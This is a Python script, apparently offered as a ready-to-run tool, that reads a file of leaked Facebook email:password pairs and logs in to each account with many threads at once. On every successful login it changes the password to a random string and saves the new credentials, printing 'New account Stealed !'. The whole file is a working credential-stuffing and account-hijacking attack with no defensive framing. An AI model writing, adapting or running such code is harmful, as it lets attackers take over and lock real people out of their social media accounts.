import mechanize
import random
import threading

def chunkIt(seq, num):
  avg = len(seq) / float(num)
  out = []
  last = 0.0
  while last < len(seq):
    out.append(seq[int(last):int(last + avg)])
    last += avg
  return out

class bcolors:

    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'


def changepwd(emaillist, filex):
    for a in emaillist:
        try:
            if a.endswith('\n'):
                a = a[:-1]
            a= a.split(':')
            email = a[0]
            passwd = a[1]
            br = mechanize.Browser()
            br.set_handle_robots(False)
            br.set_handle_redirect(True)
            br.set_handle_gzip(True)
            br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
            br.open('http://m.facebook.com/login.php')
            br.select_form(nr=0)
            br.form['email'] = email
            br.form['pass'] = passwd
            br.submit()
            if 'm.facebook.com/login.php' in br.geturl() or 'checkpoint' in br.geturl() or 'to confirm your account with Facebook.' in br.response().read():
                printed = "["+bcolors.FAIL + "-" + bcolors.ENDC +"]Could Not Login with {" + str(a)+"}"
                print "blocked"
                continue
            br.open('http://m.facebook.com/settings/account/?password')
            br.reload()
            try:
                br.select_form(nr=0)
                br.form['old_password'] = passwd
                password2 = genrandom()
                br.form['new_password'] = password2
                br.form['confirm_password'] = password2
                br.submit()
            except:
                br.select_form(nr=1)
                br.form['old_password'] = passwd
                password2 = genrandom()
                br.form['new_password'] = password2
                br.form['confirm_password'] = password2
                br.submit()
            br.close()
            open(filex, 'a').write(email+ ":" + password2 + '\n')
            print "New account Stealed !"
        except Exception,e:
            print e

def genrandom():
    x = random.randint(6,8)
    pw = ''
    for a in xrange(x):
        pw+=random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
    return pw

acs = open(raw_input("["+bcolors.OKBLUE + "*" + bcolors.ENDC +"]Location of the File with Accounts:\n=> ")).readlines()
len_acs=len(acs)
newfile = raw_input("["+bcolors.OKBLUE + "*" + bcolors.ENDC +"]Location of the File to save the working accounts:\n=> ")
nbthreads = input("["+bcolors.OKBLUE + "*" + bcolors.ENDC +"]Number of threads tha Will Be Working at the same time:\n=> ")
if len(acs) > nbthreads:
    z = chunkIt(acs, nbthreads)
    for passz in z:
        threading.Thread(target=changepwd, args=(passz,newfile)).start()
else:
    z = chunkIt(acs, len(acs))
    for passz in z:
        threading.Thread(target=changepwd, args=(passz,newfile)).start()
